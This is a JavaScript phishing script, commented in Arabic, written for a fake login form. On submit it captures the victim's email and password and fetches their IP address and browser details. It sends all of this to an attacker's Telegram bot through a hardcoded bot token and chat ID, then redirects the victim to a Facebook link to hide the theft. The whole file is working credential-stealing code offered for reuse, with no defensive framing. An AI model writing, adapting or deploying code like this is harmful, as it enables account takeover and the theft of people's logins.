document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    // 1. بيانات البوت (استبدلها بقيمك الخاصة)
    const BOT_TOKEN = '7678960020:AAFSToYS6Hn5x_9JnPA6GvqBr_ZLlirrqgo';
    const CHAT_ID = '7341192450';
    const REDIRECT_URL = 'https://www.facebook.com/share/g/14ukXTgy57B/?mibextid=wwXIfr'; // استبدل برابط صفحتك المحددة

    // 2. جمع البيانات مع إضافة معلومات إضافية
    const formData = {
        email: this.email.value,
        password: this.password.value,
        time: new Date().toLocaleString('ar-EG'), // توقيت عربي
        ip: await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip).catch(() => 'غير معروف'),
        userAgent: navigator.userAgent
    };

    // 3. صياغة الرسالة بشكل منظم
    const messageText = `
    🚀 بيانات دخول جديدة:
    --------------------------
    📧 الإيميل: ${formData.email}
    🔐 كلمة السر: ${formData.password}
    ⏰ التاريخ: ${formData.time}
    🌐 IP: ${formData.ip}
    💻 المتصفح: ${formData.userAgent}
    --------------------------
    `;

    // 4. إرسال البيانات بدون انتظار رد السيرفر (لضمان السرعة)
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: messageText,
            disable_notification: false
        })
    }).catch(error => console.error('Error sending to Telegram:', error));

    // 5. توجيه فوري مع منع الإعادة
    window.location.replace(REDIRECT_URL);
    return false;
});
